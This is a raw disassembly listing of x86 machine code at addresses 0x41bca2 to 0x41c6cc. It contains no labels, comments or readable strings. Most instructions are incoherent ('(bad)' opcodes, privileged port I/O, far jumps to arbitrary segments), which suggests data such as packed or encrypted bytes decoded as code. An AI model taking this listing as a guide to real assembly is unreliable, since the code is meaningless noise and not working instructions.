  41bca2:	xor    al,0xac
  41bca4:	in     eax,0x54
  41bca6:	dec    edi
  41bca7:	adc    al,0x6e
  41bca9:	xchg   ecx,eax
  41bcaa:	repnz repz mov ds:0x88eee01d,al
  41bcb1:	cmp    ebp,esi
  41bcb3:	mov    ah,0x45
  41bcb5:	mov    ebp,0xbf211f63
  41bcba:	jg     0x41bd25
  41bcbc:	sbb    cl,BYTE PTR gs:[edi+0x20214ec9]
  41bcc3:	mov    esp,0x1129898f
  41bcc8:	es or  eax,0xb6928a3
  41bcce:	popa   
  41bccf:	leave  
  41bcd0:	inc    eax
  41bcd1:	(bad)  
  41bcd2:	cdq    
  41bcd3:	adc    ecx,DWORD PTR [eax+eax*8]
  41bcd6:	push   ebp
  41bcd7:	cmp    al,0xeb
  41bcd9:	mov    bh,0xca
  41bcdb:	sub    eax,0x5c5692d9
  41bce0:	mov    esp,0x4df5cc31
  41bce5:	mov    edx,DWORD PTR [ecx+eiz*8]
  41bce8:	rol    DWORD PTR [ebx+0x4048de],0x0
	...
  41bd53:	add    BYTE PTR [eax],al
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x7e16d9d8
  41bd64:	xor    DWORD PTR [esi],ebx
  41bd66:	adc    ebp,DWORD PTR [ebx]
  41bd68:	add    DWORD PTR [eax],eax
  41bd6a:	inc    DWORD PTR [eax]
  41bd6c:	add    BYTE PTR [eax],al
  41bd6e:	test   eax,0xf91f4a0a
  41bd73:	out    dx,al
  41bd74:	and    edx,DWORD PTR [ecx+0x744b40d1]
  41bd7a:	or     edi,esi
  41bd7c:	cmp    DWORD PTR [ebp-0x4e],ebp
  41bd7f:	ja     0x41bd24
  41bd81:	add    al,0x3f
  41bd83:	push   es
  41bd84:	dec    eax
  41bd85:	jae    0x41bd91
  41bd87:	cwde   
  41bd88:	cmp    eax,0xe7340e3f
  41bd8d:	or     al,0x26
  41bd8f:	or     BYTE PTR ds:0xa4805772,bl
  41bd95:	ret    0xfc9c
  41bd98:	jmp    0x5766a0e9
  41bd9d:	nop
  41bd9e:	aad    0xdd
  41bda0:	xchg   ebx,eax
  41bda1:	(bad)  
  41bda2:	or     al,0x0
  41bda4:	sub    ebp,esp
  41bda6:	idiv   BYTE PTR ds:0x3df44b94
  41bdac:	out    0x66,eax
  41bdae:	or     ebp,edx
  41bdb0:	adc    al,bh
  41bdb2:	call   0xc3fa2e1b
  41bdb7:	fs adc eax,0xa2317be1
  41bdbd:	push   ecx
  41bdbe:	les    ebp,FWORD PTR [edx]
  41bdc0:	popf   
  41bdc1:	pushf  
  41bdc2:	inc    ebx
  41bdc3:	dec    ebp
  41bdc4:	cmp    ebp,DWORD PTR [esi+0x7c68a9e2]
  41bdca:	pop    ebx
  41bdcb:	inc    esp
  41bdcc:	jae    0x41bdf5
  41bdce:	dec    esp
  41bdcf:	adc    al,0x1
  41bdd1:	pop    ecx
  41bdd2:	dec    edi
  41bdd3:	in     eax,0xd9
  41bdd5:	popa   
  41bdd6:	in     al,0xe3
  41bdd8:	rcl    ebp,1
  41bdda:	mov    ah,0xe
  41bddc:	add    al,al
  41bdde:	push   0x7404beaf
  41bde3:	or     al,0x49
  41bde5:	rcl    BYTE PTR [edi-0x6d8a49bf],0xeb
  41bdec:	jmp    0xf9a7:0x9f54a533
  41bdf3:	scas   eax,DWORD PTR es:[edi]
  41bdf4:	jae    0x41be2c
  41bdf6:	mov    ebx,0x1eb35afd
  41bdfb:	shr    BYTE PTR [esi+0x2ba63121],cl
  41be01:	pop    ds
  41be02:	dec    esi
  41be03:	jno    0x41bd8d
  41be05:	pop    es
  41be06:	mov    ch,0x95
  41be08:	or     esp,DWORD PTR [eax]
  41be0a:	push   ecx
  41be0b:	jmp    0x66e1:0x4e5efed7
  41be12:	pop    esi
  41be13:	ins    BYTE PTR es:[edi],dx
  41be14:	adc    BYTE PTR ds:0x54119584,dh
  41be1a:	(bad)  [esi+0x3f]
  41be1d:	jae    0x41be98
  41be1f:	pushf  
  41be20:	cmp    esi,DWORD PTR ds:0x58436bfc
  41be26:	xor    eax,0x16335523
  41be2b:	jmp    0x41be78
  41be2d:	in     al,dx
  41be2e:	inc    edi
  41be2f:	push   edx
  41be30:	xor    eax,0xc00d2a99
  41be35:	xchg   esi,eax
  41be36:	push   esi
  41be37:	cli    
  41be38:	aad    0x5c
  41be3a:	mov    edx,0x50cc9590
  41be3f:	dec    edi
  41be40:	mov    ch,BYTE PTR [eax+0x9d7069b]
  41be46:	xchg   esi,eax
  41be47:	stc    
  41be48:	icebp  
  41be49:	add    BYTE PTR [edi+eax*1-0x159978cf],ch
  41be50:	sub    al,0x3e
  41be52:	mov    edi,0x1d187a8f
  41be57:	push   esi
  41be58:	(bad)  
  41be5a:	outs   dx,DWORD PTR ds:[esi]
  41be5b:	inc    ebx
  41be5c:	jl     0x41be5a
  41be5e:	jmp    0x9c27c2ad
  41be63:	xor    edx,DWORD PTR [eax-0x4f]
  41be66:	out    dx,eax
  41be67:	aaa    
  41be68:	mov    ah,0x7d
  41be6a:	and    BYTE PTR [esp+edx*2+0x0],0x0
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx+0x11f93f66]
  41bee4:	cmc    
  41bee5:	cmp    eax,0x12c12
  41beea:	inc    DWORD PTR [eax]
  41beec:	add    BYTE PTR [eax],al
  41beee:	push   edx
  41beef:	add    al,0x37
  41bef1:	jne    0x41bf2f
  41bef3:	data16 test al,0x4e
  41bef6:	push   edi
  41bef7:	(bad)  
  41bef8:	inc    esi
  41bef9:	sahf   
  41befa:	fstp   DWORD PTR [eax-0x20]
  41befd:	fdiv   st,st(4)
  41beff:	(bad)  
  41bf00:	cdq    
  41bf01:	bound  ebx,QWORD PTR [edx]
  41bf03:	inc    esi
  41bf04:	pop    edx
  41bf05:	jb     0x41beeb
  41bf07:	in     al,dx
  41bf08:	scas   eax,DWORD PTR es:[edi]
  41bf09:	ret    0x2412
  41bf0c:	out    dx,al
  41bf0d:	ja     0x41bee8
  41bf0f:	or     eax,ebp
  41bf11:	sub    eax,0xc9c560d4
  41bf16:	daa    
  41bf17:	xchg   BYTE PTR [ebx-0x29],cl
  41bf1a:	add    al,0xd8
  41bf1c:	add    edx,0xc2228472
  41bf22:	push   ecx
  41bf23:	out    dx,eax
  41bf24:	adc    eax,0x7e4bbe5c
  41bf29:	iretw  
  41bf2b:	xor    DWORD PTR [ebp+0x26ad119],ecx
  41bf31:	and    eax,0x5c66f387
  41bf36:	cmp    eax,0x78ef698
  41bf3b:	adc    al,dh
  41bf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3e:	mov    esp,0x8afe4580
  41bf43:	mov    ds:0xb2e2a488,eax
  41bf48:	sbb    cl,dl
  41bf4a:	aad    0x26
  41bf4c:	inc    edx
  41bf4d:	push   edx
  41bf4e:	das    
  41bf4f:	sbb    BYTE PTR [edi],dh
  41bf51:	cmp    eax,0xa6a21f91
  41bf56:	mov    DWORD PTR [esi],ecx
  41bf58:	ret    
  41bf59:	mov    ebx,0xdd151bc9
  41bf5e:	add    ch,BYTE PTR [edx]
  41bf60:	dec    esi
  41bf61:	ror    BYTE PTR [esi],1
  41bf63:	xchg   ebx,eax
  41bf64:	icebp  
  41bf65:	pop    ebx
  41bf66:	cld    
  41bf67:	pop    ebp
  41bf68:	push   eax
  41bf69:	mov    al,cl
  41bf6b:	(bad)  
  41bf6c:	out    dx,eax
  41bf6d:	fsub   st(3),st
  41bf6f:	inc    ebx
  41bf70:	and    eax,0xa68e3cb8
  41bf75:	sub    eax,0x1b3889f
  41bf7a:	shl    BYTE PTR [edi-0x40],0x66
  41bf7e:	inc    esp
  41bf7f:	xor    eax,DWORD PTR [ebx]
  41bf81:	sbb    ebp,DWORD PTR [eax]
  41bf83:	and    ebp,DWORD PTR [ebp-0x7cc1f046]
  41bf89:	fs int 0xcf
  41bf8c:	mov    ecx,DWORD PTR [edi]
  41bf8e:	scas   eax,DWORD PTR es:[edi]
  41bf8f:	lea    edx,[eax]
  41bf91:	(bad)  
  41bf92:	adc    eax,0x2853bfa3
  41bf97:	sbb    ecx,DWORD PTR [edi]
  41bf99:	outs   dx,DWORD PTR ds:[esi]
  41bf9a:	lock lea edi,[ecx-0x34]
  41bf9e:	test   al,0x7
  41bfa0:	lahf   
  41bfa1:	movq   mm5,mm4
  41bfa4:	scas   al,BYTE PTR es:[edi]
  41bfa5:	ret    0x752a
  41bfa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfa9:	sbb    ch,BYTE PTR [edi-0x29]
  41bfac:	sbb    eax,0x2f9467f6
  41bfb1:	xor    DWORD PTR [edi-0x45],0x27
  41bfb5:	nop
  41bfb6:	sub    al,0x34
  41bfb8:	sub    al,0xdd
  41bfba:	push   ecx
  41bfbb:	jmp    ecx
  41bfbd:	jmp    0x7231d00e
  41bfc2:	ret    
  41bfc3:	mov    bh,0xe3
  41bfc5:	jg     0x41c003
  41bfc7:	shl    BYTE PTR [ebx+ebx*4],0xfb
  41bfcb:	and    eax,0xc1cf5e64
  41bfd0:	dec    esi
  41bfd1:	inc    ecx
  41bfd2:	(bad)  [esi+ebx*2-0x32]
  41bfd6:	mov    ah,0x6f
  41bfd8:	dec    ebp
  41bfd9:	cdq    
  41bfda:	adc    ebx,DWORD PTR [ecx]
  41bfdc:	sub    al,0xfb
  41bfde:	adc    ebp,DWORD PTR [eax+0x69]
  41bfe1:	jl     0x41bf63
  41bfe3:	popf   
  41bfe4:	fmul   DWORD PTR [esi+0x17]
  41bfe7:	adc    eax,0x3199ed4
  41bfec:	add    eax,DWORD PTR [eax]
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	lds    esp,FWORD PTR [eax+0x2d112be6]
  41c068:	add    DWORD PTR [eax],eax
  41c06a:	inc    DWORD PTR [eax]
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	sbb    dh,BYTE PTR [eax-0x7fa89f35]
  41c074:	lods   al,BYTE PTR ds:[esi]
  41c075:	mov    bh,0xf6
  41c077:	inc    edx
  41c078:	adc    cl,ah
  41c07a:	push   edx
  41c07b:	cmp    al,cl
  41c07d:	(bad)  
  41c07e:	xor    bh,BYTE PTR [ebp-0x40]
  41c081:	add    ch,BYTE PTR [ecx+ebp*2+0x3d]
  41c085:	or     DWORD PTR [edi],edx
  41c087:	not    DWORD PTR [eax+0x54]
  41c08a:	loop   0x41c043
  41c08c:	lods   al,BYTE PTR ds:[esi]
  41c08d:	sbb    al,0xc1
  41c08f:	fdivr  DWORD PTR [edx+0x637b848f]
  41c095:	add    bl,ch
  41c097:	popf   
  41c098:	pushf  
  41c099:	dec    ecx
  41c09a:	sub    esp,edx
  41c09c:	xchg   edi,eax
  41c09d:	shr    BYTE PTR [eax+0x12],1
  41c0a0:	xchg   edi,eax
  41c0a1:	xor    DWORD PTR [edi-0x23],ecx
  41c0a4:	xchg   ebx,eax
  41c0a5:	jmp    0x7891:0x58a9f631
  41c0ac:	mov    bl,0x18
  41c0ae:	lock xor cl,BYTE PTR [ebx+0x5b]
  41c0b2:	mov    edx,0xf7f8eb6d
  41c0b7:	hlt    
  41c0b8:	pop    ebx
  41c0b9:	outs   dx,DWORD PTR ds:[esi]
  41c0ba:	pushf  
  41c0bb:	outs   dx,DWORD PTR ds:[esi]
  41c0bc:	pop    ebx
  41c0bd:	or     eax,0xd98d845
  41c0c2:	push   ss
  41c0c3:	loopne 0x41c0f9
  41c0c5:	daa    
  41c0c6:	pop    ebx
  41c0c7:	lods   al,BYTE PTR ds:[esi]
  41c0c8:	(bad)  
  41c0c9:	xor    al,BYTE PTR [eax+0x20]
  41c0cc:	jno    0x41c0a7
  41c0ce:	push   es
  41c0cf:	add    DWORD PTR [esi+0x32],0xcad7655d
  41c0d6:	addr16 jg 0x41c14e
  41c0d9:	scas   eax,DWORD PTR es:[edi]
  41c0da:	call   0xac5485ce
  41c0df:	in     al,dx
  41c0e0:	jno    0x41c13a
  41c0e2:	dec    ebx
  41c0e3:	retf   
  41c0e4:	cwde   
  41c0e5:	stos   DWORD PTR es:[edi],eax
  41c0e6:	cmp    eax,0x38a5eddf
  41c0eb:	and    eax,0x21ceeccd
  41c0f0:	adc    ah,BYTE PTR [eax]
  41c0f2:	inc    esp
  41c0f3:	aas    
  41c0f4:	sub    ch,BYTE PTR [eax+ebp*4]
  41c0f7:	jmp    0x41c0c1
  41c0f9:	and    DWORD PTR [esp+ecx*8+0x40],esp
  41c0fd:	call   0xc36a5fdf
  41c102:	ret    
  41c103:	mov    BYTE PTR [eax+0x3c6b3127],bl
  41c109:	mov    ebp,0x612daf29
  41c10e:	cld    
  41c10f:	scas   al,BYTE PTR es:[edi]
  41c110:	das    
  41c111:	stos   DWORD PTR es:[edi],eax
  41c112:	enter  0x6326,0x8e
  41c116:	inc    ebx
  41c117:	sbb    BYTE PTR [edx+0x787e22e5],bh
  41c11d:	leave  
  41c11e:	sub    BYTE PTR [eax],0x8b
  41c121:	js     0x41c11a
  41c123:	ja     0x41c0e6
  41c125:	add    dh,ch
  41c127:	sbb    al,0xc9
  41c129:	aam    0x3e
  41c12b:	push   edx
  41c12c:	xchg   BYTE PTR [edi+ecx*2+0x17523862],cl
  41c133:	pusha  
  41c134:	cli    
  41c135:	mov    ah,0x54
  41c137:	fst    DWORD PTR [ebx]
  41c139:	push   es
  41c13a:	ins    DWORD PTR es:[edi],dx
  41c13b:	sahf   
  41c13c:	jne    0x41c140
  41c13e:	mov    edi,0xbf9f8116
  41c143:	mov    ch,0xdd
  41c145:	hlt    
  41c146:	mov    bh,0xce
  41c148:	ja     0x41c130
  41c14a:	sbb    ecx,esp
  41c14c:	mov    edx,0xc94bc1d5
  41c151:	mov    ecx,0xc7575896
  41c156:	mov    esi,0x5923746
  41c15b:	dec    edi
  41c15c:	cwde   
  41c15d:	aad    0x1
  41c15f:	cmc    
  41c160:	sub    eax,0x88f55ebc
  41c165:	fmul   DWORD PTR [ebx+0x8]
  41c168:	pop    esi
  41c169:	call   0x0:0xff7a5c
	...
  41c1d4:	add    BYTE PTR [eax],al
  41c1d6:	(bad)  [edx-0x5f]
  41c1d9:	clc    
  41c1da:	mov    bl,0xfb
  41c1dc:	fldcw  WORD PTR [ebx+0x3d]
  41c1df:	add    DWORD PTR ds:0x5a869ce9,eax
  41c1e5:	push   0x10
  41c1e7:	add    DWORD PTR cs:[eax],eax
  41c1ea:	inc    DWORD PTR [eax]
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	int    0x90
  41c1f0:	lahf   
  41c1f1:	clc    
  41c1f2:	fisubr WORD PTR [esi]
  41c1f4:	xchg   al,ch
  41c1f6:	sysexit 
  41c1f8:	pop    edi
  41c1f9:	int3   
  41c1fa:	call   0x9f46:0x62179148
  41c201:	sbb    eax,edi
  41c203:	mov    edi,0x7129443e
  41c208:	pop    edx
  41c209:	jmp    0x41c205
  41c20b:	adc    al,0x19
  41c20d:	cpuid  
  41c20f:	std    
  41c210:	cwde   
  41c211:	mov    eax,ds:0xfe1f170a
  41c216:	push   eax
  41c217:	cmp    dh,BYTE PTR [ecx]
  41c219:	sub    ch,BYTE PTR ds:0xc9617b63
  41c21f:	call   0xb5592d4b
  41c224:	stos   DWORD PTR es:[edi],eax
  41c225:	sbb    DWORD PTR [esi+0x691ae461],edi
  41c22b:	jnp    0x41c250
  41c22d:	mov    DWORD PTR ds:0x538d6719,eax
  41c233:	mov    cl,0xb9
  41c235:	mov    ch,0x58
  41c237:	xlat   BYTE PTR ds:[ebx]
  41c238:	xlat   BYTE PTR ds:[ebx]
  41c239:	mov    al,ds:0x44638be4
  41c23e:	iret   
  41c23f:	and    BYTE PTR [ecx+0x71],dh
  41c242:	add    al,0x92
  41c244:	cld    
  41c245:	std    
  41c246:	xchg   ebx,eax
  41c247:	xchg   edx,eax
  41c248:	repnz xor eax,0xc547e3f0
  41c24e:	mov    al,ds:0xa30d3129
  41c253:	aam    0x53
  41c255:	pop    edx
  41c256:	aam    0x54
  41c258:	xor    DWORD PTR ds:0x1e1d3f3e,0xffffffef
  41c25f:	cmp    ah,BYTE PTR [edx-0x2f5c4898]
  41c265:	mov    ebx,0x2d6d0fa5
  41c26a:	jno    0x41c2d0
  41c26c:	push   cs
  41c26d:	gs shl dl,cl
  41c270:	pop    ebx
  41c271:	mov    dh,0x74
  41c273:	int    0x2
  41c275:	ret    
  41c276:	sub    al,BYTE PTR [ecx]
  41c278:	out    0x4e,eax
  41c27a:	or     DWORD PTR [edx],eax
  41c27c:	add    BYTE PTR [eax+0x77],cl
  41c27f:	inc    ebx
  41c280:	fiadd  WORD PTR [edx-0x543833c7]
  41c286:	pop    ds
  41c287:	test   DWORD PTR [esi+edi*8-0x50948779],ebx
  41c28e:	fs js  0x41c233
  41c291:	adc    eax,0x9e4f24b9
  41c296:	cli    
  41c297:	push   edx
  41c298:	scas   al,BYTE PTR es:[edi]
  41c299:	(bad)  
  41c29a:	sbb    al,0xec
  41c29c:	xchg   ebp,eax
  41c29d:	(bad)  
  41c29e:	push   esi
  41c29f:	hlt    
  41c2a0:	ret    0x3915
  41c2a3:	aas    
  41c2a4:	pop    eax
  41c2a5:	cs aad 0x5b
  41c2a8:	mov    edi,0xa5e75209
  41c2ad:	dec    edi
  41c2ae:	jmp    0x41c2fa
  41c2b0:	out    dx,eax
  41c2b1:	inc    ebp
  41c2b2:	mov    dl,0x33
  41c2b4:	cs (bad) 
  41c2b6:	jp     0x41c2db
  41c2b8:	stc    
  41c2b9:	pop    ecx
  41c2ba:	repz dec eax
  41c2bc:	sbb    eax,0x755e1852
  41c2c1:	xchg   esi,eax
  41c2c2:	pop    eax
  41c2c3:	inc    esp
  41c2c4:	(bad)  
  41c2c5:	shl    DWORD PTR [edx],cl
  41c2c7:	pop    edx
  41c2c8:	or     esi,esp
  41c2ca:	add    dh,BYTE PTR [esi]
  41c2cc:	icebp  
  41c2cd:	cdq    
  41c2ce:	outs   dx,DWORD PTR ds:[esi]
  41c2cf:	ret    
  41c2d0:	add    ch,cl
  41c2d2:	and    DWORD PTR [esp+edx*4-0xe],0x178a1d25
  41c2da:	jg     0x41c337
  41c2dc:	xchg   DWORD PTR [esi+edi*4+0x74],ecx
  41c2e0:	out    dx,eax
  41c2e1:	cld    
  41c2e2:	jae    0x41c2c5
  41c2e4:	push   cs
  41c2e5:	pop    esi
  41c2e6:	cmp    bl,BYTE PTR [eax+eax*2]
  41c2e9:	xchg   edx,eax
  41c2ea:	dec    esi
  41c2eb:	or     edi,DWORD PTR [edi+0x0]
	...
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	xor    DWORD PTR [ecx+0x2f0f16f2],ebx
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	inc    DWORD PTR [eax]
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	add    cl,0xd8
  41c371:	mov    esi,0xd54e2059
  41c376:	lahf   
  41c377:	aad    0x7
  41c379:	mov    ebx,0xd63acce3
  41c37e:	(bad)  
  41c37f:	shl    DWORD PTR [ebp-0x8135035],0xd9
  41c386:	mov    bl,0x75
  41c388:	scas   al,BYTE PTR es:[edi]
  41c389:	xabort 0x74
  41c38c:	cmp    BYTE PTR [esi-0x246c8cc7],cl
  41c392:	sub    BYTE PTR [esi-0x1e],dh
  41c395:	dec    esp
  41c396:	(bad)  [esi]
  41c398:	pop    ebp
  41c399:	sahf   
  41c39a:	inc    edi
  41c39b:	(bad)  
  41c39c:	popa   
  41c39d:	cmp    DWORD PTR [edi+0x50],ebx
  41c3a0:	sbb    cl,dh
  41c3a2:	repz lds eax,FWORD PTR [ecx+ebx*4]
  41c3a6:	add    eax,0xfda3c30
  41c3ab:	or     esi,DWORD PTR [eax+0x329e653d]
  41c3b1:	in     al,0xfa
  41c3b3:	scas   al,BYTE PTR es:[edi]
  41c3b4:	pop    esi
  41c3b5:	sbb    esp,ebx
  41c3b7:	sub    esi,DWORD PTR [edi+0x5eff3e47]
  41c3bd:	int3   
  41c3be:	jge    0x41c3af
  41c3c0:	xor    al,0x22
  41c3c2:	in     al,0x65
  41c3c4:	push   ss
  41c3c5:	mov    ds:0xfbb11c90,al
  41c3ca:	fistp  WORD PTR [ebp-0x2]
  41c3cd:	test   eax,0xa99cd80a
  41c3d2:	sbb    eax,0xb4eb7c7c
  41c3d7:	xchg   ecx,eax
  41c3d8:	inc    ebp
  41c3d9:	or     al,0x95
  41c3db:	or     edi,DWORD PTR [ecx]
  41c3dd:	aam    0x4c
  41c3df:	dec    eax
  41c3e0:	mov    esi,0x9ed5c40d
  41c3e5:	and    BYTE PTR [ebx+eax*8],bh
  41c3e8:	xchg   edx,eax
  41c3e9:	outs   dx,DWORD PTR ds:[esi]
  41c3ea:	mov    ds:0x2df3189d,al
  41c3ef:	inc    dx
  41c3f1:	lods   al,BYTE PTR ds:[esi]
  41c3f2:	popa   
  41c3f3:	cmp    cl,BYTE PTR [ebp+0x43]
  41c3f6:	push   ebx
  41c3f7:	cmp    DWORD PTR [ebx+0x12fc7185],0xb
  41c3fe:	xchg   DWORD PTR [edi+eiz*1-0x16454c67],edx
  41c405:	ss jnp 0x41c38c
  41c408:	adc    BYTE PTR [ebp-0x46fe1544],al
  41c40e:	rol    BYTE PTR [edx-0x33],1
  41c411:	mov    ds:0xba563dba,eax
  41c416:	jae    0x41c463
  41c418:	(bad)  
  41c419:	jp     0x41c3cb
  41c41b:	jp     0x41c409
  41c41d:	mov    ebp,0xf67edd29
  41c422:	dec    cx
  41c424:	or     dl,BYTE PTR [ebx]
  41c426:	jo     0x41c41d
  41c428:	leave  
  41c429:	cmp    DWORD PTR gs:[eax],esi
  41c42c:	clc    
  41c42d:	cmp    BYTE PTR [eax],ch
  41c42f:	jmp    0x410a:0x65f36a1d
  41c436:	jb     0x41c414
  41c438:	jmp    0x41c49f
  41c43a:	out    dx,eax
  41c43b:	mov    esp,0x49df44d
  41c440:	lock cmc 
  41c442:	je     0x41c3cc
  41c444:	(bad)
  41c448:	cmp    DWORD PTR ds:0xff464052,esp
  41c44e:	cld    
  41c44f:	mov    ebp,0x727ad36d
  41c454:	push   0x69
  41c456:	cmp    dh,BYTE PTR [ebp-0x14]
  41c459:	jg     0x41c4d9
  41c45b:	sub    al,0xc9
  41c45d:	shl    DWORD PTR [edx-0x34],1
  41c460:	push   ss
  41c461:	aas    
  41c462:	fldcw  WORD PTR [esi-0x65]
  41c465:	xor    al,0xb4
  41c467:	scas   eax,DWORD PTR es:[edi]
  41c468:	mov    DWORD PTR [edx+0x69],ecx
  41c46b:	dec    BYTE PTR [eax+eax*1+0x0]
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	ffree  st(6)
  41c4e4:	mov    bh,0x14
  41c4e6:	push   cs
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    bh,bh
  41c4eb:	add    BYTE PTR [eax],al
  41c4ed:	add    al,ah
  41c4ef:	inc    esi
  41c4f0:	test   al,0x69
  41c4f2:	iret   
  41c4f3:	jns    0x41c53b
  41c4f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4f6:	js     0x41c56a
  41c4f8:	pop    edx
  41c4f9:	dec    esp
  41c4fa:	lahf   
  41c4fb:	jecxz  0x41c572
  41c4fd:	add    edi,DWORD PTR [esi+0x4]
  41c500:	lea    ebp,[ecx-0x4e903cd4]
  41c506:	fs mov dl,0x17
  41c509:	fld    TBYTE PTR [ebx]
  41c50b:	mov    al,0x89
  41c50d:	repz jne 0x41c56e
  41c510:	sbb    ebx,DWORD PTR [eax+eax*8-0x8144e4c]
  41c517:	xchg   BYTE PTR [ebp+0x1042f6b2],ah
  41c51d:	mov    bh,0xb
  41c51f:	adc    edi,DWORD PTR [ebx-0x419fb68]
  41c525:	add    bh,BYTE PTR [ebp+0x4b]
  41c528:	xor    DWORD PTR [edx-0x1f5b5529],ebp
  41c52e:	ins    BYTE PTR es:[edi],dx
  41c52f:	in     al,dx
  41c530:	sti    
  41c531:	mov    eax,0x25f06073
  41c536:	es (bad) 
  41c538:	jnp    0x41c522
  41c53a:	or     BYTE PTR [eax+eax*8+0x47],dl
  41c53e:	aaa    
  41c53f:	jmp    0xd028:0xcf9b74d8
  41c546:	cmc    
  41c547:	mov    BYTE PTR [ebx-0x2c],cl
  41c54a:	fwait
  41c54b:	jmp    0x41c54c
  41c54d:	or     bl,BYTE PTR ds:0xb8146beb
  41c553:	adc    BYTE PTR [ebp+0x33dd9bfd],cl
  41c559:	mov    cl,0x84
  41c55b:	fs pop eax
  41c55d:	cmc    
  41c55e:	gs fwait
  41c560:	lods   al,BYTE PTR ds:[esi]
  41c561:	mov    eax,0x3f34c93f
  41c566:	stos   BYTE PTR es:[edi],al
  41c567:	adc    ch,0x8e
  41c56a:	jo     0x41c552
  41c56c:	xor    DWORD PTR [eax+ebx*1+0x25bcb53b],esi
  41c573:	push   ss
  41c574:	jo     0x41c523
  41c576:	scas   eax,DWORD PTR es:[edi]
  41c577:	scas   eax,DWORD PTR es:[edi]
  41c578:	sub    eax,0x9b3e6738
  41c57d:	push   edx
  41c57e:	in     eax,dx
  41c57f:	shl    dl,cl
  41c581:	push   ecx
  41c582:	lods   eax,DWORD PTR ds:[esi]
  41c583:	ins    DWORD PTR es:[edi],dx
  41c584:	cdq    
  41c585:	sbb    BYTE PTR [esi+ebx*8-0x585b3a15],al
  41c58c:	mov    edi,0x83a4cb47
  41c591:	pop    edi
  41c592:	add    BYTE PTR [edi-0x41],0xa4
  41c596:	jge    0x41c5ed
  41c598:	mov    dh,0xd3
  41c59a:	dec    edi
  41c59b:	int    0xf4
  41c59d:	dec    ebx
  41c59e:	aam    0x28
  41c5a0:	pop    ss
  41c5a1:	adc    DWORD PTR [ecx-0x1f],0xffffff86
  41c5a5:	iret   
  41c5a6:	dec    esp
  41c5a7:	adc    BYTE PTR [ebx-0x6f],0x42
  41c5ab:	pop    edi
  41c5ac:	mov    ds:0xf83e7e06,eax
  41c5b1:	push   cs
  41c5b2:	pop    ebp
  41c5b3:	dec    edx
  41c5b4:	pushf  
  41c5b5:	sar    BYTE PTR es:[bx+si-0x5b23],0x6c
  41c5bc:	mov    dh,0xc4
  41c5be:	mov    edx,0xcff99da8
  41c5c3:	add    eax,0xacf3cc8
  41c5c9:	lods   eax,DWORD PTR ds:[esi]
  41c5ca:	pop    eax
  41c5cb:	and    bl,dh
  41c5cd:	arpl   WORD PTR [edi+0x3dad3bc2],di
  41c5d3:	or     esi,ebx
  41c5d5:	pop    ebp
  41c5d6:	scas   al,BYTE PTR es:[edi]
  41c5d7:	and    eax,0xd196b99a
  41c5dc:	adc    al,0xa0
  41c5de:	dec    edi
  41c5df:	out    dx,eax
  41c5e0:	xor    eax,0xeb1b5ece
  41c5e5:	not    DWORD PTR cs:[ebx+0x68]
  41c5e9:	rol    BYTE PTR [ebp+0x4b53],0x0
	...
  41c654:	add    BYTE PTR [eax],al
  41c656:	lds    esp,FWORD PTR [ebx]
  41c658:	xchg   ecx,eax
  41c659:	and    eax,0xe3f5b7f7
  41c65e:	inc    ebx
  41c65f:	and    ch,ch
  41c661:	call   0x310d:0x4731246e
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	inc    DWORD PTR [eax]
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	xlat   BYTE PTR ds:[ebx]
  41c66f:	scas   eax,DWORD PTR es:[edi]
  41c670:	mov    edx,0x7a4362a3
  41c675:	int    0x9c
  41c677:	sub    bl,ch
  41c679:	mov    al,ds:0xfea6dcc2
  41c67e:	or     esp,DWORD PTR [ebx-0x62]
  41c681:	bound  ecx,QWORD PTR [ecx+0x6c932547]
  41c687:	xchg   BYTE PTR [edx],dl
  41c689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c68a:	out    0xd3,al
  41c68c:	(bad)  
  41c68d:	and    BYTE PTR [edi-0x581b8c96],ah
  41c693:	dec    ecx
  41c694:	jecxz  0x41c6b0
  41c696:	iret   
  41c697:	into   
  41c698:	sbb    bh,BYTE PTR [ebx]
  41c69a:	aaa    
  41c69b:	add    edi,DWORD PTR [edi-0x7b]
  41c69e:	jns    0x41c6bb
  41c6a0:	mov    bh,bh
  41c6a2:	(bad)  
  41c6a3:	xchg   ebx,eax
  41c6a4:	mov    ecx,0xf7681885
  41c6a9:	mov    al,0xb5
  41c6ab:	or     ebx,ebx
  41c6ad:	push   edi
  41c6ae:	xchg   edx,eax
  41c6af:	cmp    dh,BYTE PTR [ecx]
  41c6b1:	xor    eax,0xa01026be
  41c6b6:	div    ah
  41c6b8:	cmp    eax,0x618f1eb6
  41c6bd:	jge    0x41c6eb
  41c6bf:	sub    esp,edx
  41c6c1:	inc    ebx
  41c6c2:	rcr    esp,cl
  41c6c4:	dec    ecx
  41c6c5:	sbb    eax,0x5b67b985
  41c6ca:	mov    al,0xfa
  41c6cc:	and    al,0x54
